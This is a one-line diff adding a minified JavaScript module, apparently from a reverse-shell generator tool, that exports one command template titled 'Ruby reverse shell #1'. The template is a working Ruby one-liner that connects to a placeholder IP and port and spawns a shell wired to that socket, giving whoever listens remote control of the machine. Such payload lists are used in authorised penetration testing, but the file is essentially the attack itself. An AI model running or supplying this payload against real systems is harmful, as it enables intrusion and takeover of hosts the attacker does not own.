@@ -1,0 +1,1 @@
+const e=[{title:"Ruby reverse shell #1",template:`ruby -rsocket -e 'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{ip}",{port}))'`,description:"Basic Ruby reverse shell with sh spawned."}],s={commands:e};export{e as commands,s as default};
